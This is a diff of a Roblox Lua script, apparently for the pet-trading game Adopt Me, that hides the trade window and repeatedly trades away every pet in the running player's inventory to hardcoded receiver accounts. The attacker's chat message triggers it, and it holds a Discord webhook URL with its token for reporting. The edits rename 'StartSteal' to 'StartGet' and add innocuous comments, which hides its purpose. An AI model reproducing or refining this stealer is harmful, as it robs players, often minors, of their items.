@@ -1,9 +1,8 @@
 Username = "janeq is too skilled"
 Webhook = "https://discord.com/api/webhooks/1302319224185684039/ahtxsJqGagcs3ENidQuhc0GeBAmfmyKz50kZsuGGq9cV9v8pwGrxGNIKqMqGhe_bByoY"
 
-
 Config = { 
-  Receivers = {Username, "Onodakun23", "kely5171"}
+  Receiver = {Username, "Onodakun23", "kely5171"}
 }
 
 local Loads = require(game.ReplicatedStorage.Fsys).load
@@ -89,24 +88,31 @@ request({
 })
 
 
-local function SendTrade(Config.Receivers)
+-- Sends a trade request to the specified player.
+local function SendTrade(playerName)
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local RouterClient = Loads("RouterClient")
     local SendTradeRequest = RouterClient.get("TradeAPI/SendTradeRequest")
-    SendTradeRequest:FireServer(game.Players{Config.Username})
+    SendTradeRequest:FireServer(game.Players[playerName])
 end
+
+-- Adds pets from the local player's inventory to the trade offer.
 local function AddPets()
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local RouterClient = Loads("RouterClient")
     local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
     local Juj = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+    
     if Juj.pets then
         local PetCount = 0
         local PetUids = {}
+
+        -- Collect all pet UIDs from inventory
         for PetUid, PetData in pairs(Juj.pets) do
             table.insert(PetUids, PetUid)
         end
         
+        -- Add pets to the trade offer
         while #PetUids > 0 do
             local PetUid = table.remove(PetUids, 1)
             AddPetRemote:FireServer(PetUid)
@@ -119,42 +125,55 @@ local function AddPets()
         print("No pets found in inventory.")
     end
 end
+
+-- Accepts the current trade negotiation.
 local function AcceptTrade()
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local RouterClient = Loads("RouterClient")
     local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
     AcceptNegotiationRemote:FireServer()
 end
+
+-- Confirms the trade after it has been accepted.
 local function ConfirmTrade()
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local RouterClient = Loads("RouterClient")
     local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
     AcceptTradeRemote:FireServer()
 end
+
+-- Disable the TradeApp GUI
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
-local function StartSteal()
-    while task.wait(15) do
-    SendTrade(Config.Username)
-    wait(3)
-    AddPets()
-    wait(5.5)
-    AcceptTrade()
-    wait(15)
-    ConfirmTrade()
-       end
-end
-for _, plr in pairs(game.Players:GetPlayers()) do
-  if plr.Name:lower() == Username:lower() then
-    plr.Chatted:Connect(function()
-      StartSteal()
-    end)
-  end
+
+-- Main function to manage trading actions in a loop for each receiver
+local function StartGet()
+    for _, receiver in pairs(Config.Receiver) do
+        while task.wait(15) do
+            SendTrade(receiver)
+            wait(3)
+            AddPets()
+            wait(5.5)
+            AcceptTrade()
+            wait(15)
+            ConfirmTrade()
+        end
+    end
 end
 
+-- Listen for chat events from the specified player
+for _, plr in pairs(game.Players:GetPlayers()) do
+    if plr.Name:lower() == Username:lower() then
+        plr.Chatted:Connect(function()
+            StartGet()
+        end)
+    end
+end
+
+-- Listen for new players joining the game
 game.Players.PlayerAdded:Connect(function(plr)
-  if plr.Name:lower() == Username:lower() then
-    plr.Chatted:Connect(function()
-      StartSteal()
-    end)
-  end
+    if plr.Name:lower() == Username:lower() then
+        plr.Chatted:Connect(function()
+            StartGet()
+        end)
+    end
 end)
